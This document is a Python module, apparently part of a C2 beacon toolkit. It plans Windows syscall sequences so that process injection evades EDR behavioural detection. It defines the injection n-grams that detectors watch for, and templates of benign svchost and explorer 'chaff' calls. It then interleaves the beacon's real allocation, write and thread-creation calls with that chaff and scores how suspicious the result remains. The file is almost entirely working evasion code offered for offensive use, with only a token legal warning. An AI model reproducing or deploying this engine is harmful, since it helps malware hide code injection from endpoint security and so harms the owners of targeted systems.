"""
API Sequence Spoofing (Behavioral Analysis Evasion)
===================================================

Modern EDRs no longer rely only on static signatures or IAT/syscall hooks.
They build a behavioural graph of the API/syscall *sequence* a thread emits:

    NtAllocateVirtualMemory -> NtWriteVirtualMemory -> NtCreateThreadEx
        => "classic injection pattern"  -> alert

This module breaks that chain by interleaving the beacon's real API calls
with the kind of benign "heartbeat" calls that legitimate Windows services
(svchost, explorer, services.exe) emit in the background. The result looks
like ordinary housekeeping rather than an injection burst.

Approach
--------
1. A library of benign call templates ("svchost_heartbeat", "explorer_idle",
   "services_poll") derived from observed noise of real system processes.
2. `plan()` wraps each *real* (beacon) call with chaff benign calls chosen
   from a template, so consecutive sensitive calls are separated by innocent
   activity.
3. `score()` estimates how "injection-like" a resulting sequence still looks
   (lower = safer). A recognised dangerous n-gram raises the score; spreading
   the calls drops it.

This is a pure-Python, cross-platform planning engine: the actual syscall
dispatch still happens in the agent, but the *ordering* it follows is
produced here so the behavioural fingerprint matches a benign process.

⚠️ LEGAL WARNING: For authorized penetration testing only.
"""

from __future__ import annotations

import random
import secrets
from dataclasses import dataclass
from enum import Enum
from typing import Dict, List


class APICategory(Enum):
    """Coarse behavioural category of an API call"""
    BENIGN_HEARTBEAT = "benign_heartbeat"   # svchost/explorer background noise
    BENIGN_IO = "benign_io"                 # ordinary file/reg/network read
    INJECT_SENSITIVE = "inject_sensitive"  # allocation / write / thread spawn
    INJECT_SETUP = "inject_setup"           # handle / section / protect


# Canonical risky n-grams that EDR behavioural ML keys on.
INJECTION_NGRAMS = [
    ("NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtCreateThreadEx"),
    ("NtAllocateVirtualMemory", "NtWriteVirtualMemory", "NtProtectVirtualMemory", "NtCreateThreadEx"),
    ("NtCreateSection", "NtMapViewOfSection", "NtWriteVirtualMemory", "NtCreateThreadEx"),
    ("NtWriteVirtualMemory", "NtProtectVirtualMemory", "NtCreateRemoteThread"),
]


@dataclass
class APICall:
    """A single planned API call in the spoofed sequence"""
    name: str
    category: APICategory
    beacon: bool = False           # True => real beacon operation
    note: str = ""


# Benign heartbeat templates (inspired by svchost / explorer / services.exe
# background activity). These are the "chaff" calls sprinkled between real
# operations to break up injection n-grams.
BENIGN_TEMPLATES: Dict[str, List[str]] = {
    "svchost_heartbeat": [
        "NtWaitForSingleObject", "NtDelayExecution", "NtQuerySystemInformation",
        "NtOpenKey", "NtQueryValueKey", "NtClose", "NtQueryInformationProcess",
    ],
    "explorer_idle": [
        "NtWaitForMultipleObjects", "NtGetTickCount", "NtQueryInformationToken",
        "NtOpenFile", "NtReadFile", "NtClose", "NtDelayExecution",
    ],
    "services_poll": [
        "NtQuerySystemInformation", "NtOpenKey", "NtEnumerateKey",
        "NtQueryValueKey", "NtClose", "NtWaitForSingleObject",
    ],
    "rpc_background": [
        "NtAlpcSendWaitReceivePort", "NtDelayExecution", "NtQueryInformationProcess",
        "NtClose", "NtWaitForSingleObject",
    ],
}


# Map well-known sensitive APIs to their category (for n-gram awareness).
SENSITIVE_API_MAP = {
    "NtAllocateVirtualMemory": APICategory.INJECT_SENSITIVE,
    "NtWriteVirtualMemory": APICategory.INJECT_SENSITIVE,
    "NtProtectVirtualMemory": APICategory.INJECT_SENSITIVE,
    "NtCreateThreadEx": APICategory.INJECT_SENSITIVE,
    "NtCreateRemoteThread": APICategory.INJECT_SENSITIVE,
    "NtMapViewOfSection": APICategory.INJECT_SETUP,
    "NtCreateSection": APICategory.INJECT_SETUP,
    "NtOpenProcess": APICategory.INJECT_SETUP,
    "NtOpenThread": APICategory.INJECT_SETUP,
    "NtQueueApcThread": APICategory.INJECT_SETUP,
}


class APISequenceSpoofer:
    """
    Plan and score API call sequences that mimic benign Windows services.
    """

    def __init__(self, template: str = "svchost_heartbeat",
                 rng: random.Random = None, chaff_per_call: int = 2):
        self.template = template if template in BENIGN_TEMPLATES else "svchost_heartbeat"
        self.rng = rng or random.Random(secrets.randbelow(2 ** 31))
        self.chaff_per_call = max(1, chaff_per_call)

    # ------------------------------------------------------------------
    # Planning
    # ------------------------------------------------------------------
    def plan(self, real_calls: List[str], pre_chaff: int = None,
             post_chaff: int = None) -> List[APICall]:
        """
        Interleave `real_calls` with benign heartbeat calls so that no two
        sensitive calls sit directly adjacent in a recognised n-gram.

        Args:
            real_calls: ordered names of the beacon's real API calls.
            pre_chaff:  benign calls emitted before each real call.
            post_chaff: benign calls emitted after each real call.

        Returns:
            A full APICall sequence to be executed in order by the agent.
        """
        sequence: List[APICall] = []

        pre = self.chaff_per_call if pre_chaff is None else max(0, pre_chaff)
        post = self.chaff_per_call if post_chaff is None else max(0, post_chaff)

        # Leading benign preamble (looks like a service starting up).
        sequence += self._chaff(pre)

        for call in real_calls:
            category = SENSITIVE_API_MAP.get(call, APICategory.BENIGN_IO)
            # Benign calls *before* the sensitive call dilute the context.
            sequence += self._chaff(pre)
            sequence.append(APICall(name=call, category=category, beacon=True))
            # Benign calls *after* the sensitive call break the n-gram.
            sequence += self._chaff(post)

        return sequence

    def _chaff(self, count: int) -> List[APICall]:
        """Emit `count` benign heartbeat calls drawn from the template."""
        pool = BENIGN_TEMPLATES[self.template]
        out = []
        for _ in range(max(0, count)):
            name = self.rng.choice(pool)
            out.append(APICall(name=name, category=APICategory.BENIGN_HEARTBEAT))
        return out

    # ------------------------------------------------------------------
    # Scoring (how "injection-like" does this still look?)
    # ------------------------------------------------------------------
    def score(self, sequence: List[APICall]) -> float:
        """
        Estimate behavioural risk of a sequence in [0,1].
        0.0 = indistinguishable from a benign service heartbeat.
        1.0 = textbook injection burst.

        Penalises any recognised injection n-gram that survived the chaff.
        """
        names = [c.name for c in sequence]
        if not names:
            return 0.0

        risk = 0.0
        # Find any surviving injection n-gram (no benign call between steps).
        for ngram in INJECTION_NGRAMS:
            for i in range(len(names) - len(ngram) + 1):
                window = names[i:i + len(ngram)]
                if list(window) == list(ngram):
                    risk += 0.5
        # Density of beacon calls also contributes.
        beacon_calls = sum(1 for c in sequence if c.beacon)
        density = beacon_calls / len(names)
        risk += 0.5 * max(0.0, density - 0.2)
        return min(1.0, risk)

    def benign_score(self) -> float:
        """Risk score of a pure benign heartbeat (sanity baseline)."""
        seq = self.plan([]) or self._chaff(6)
        return self.score(seq)
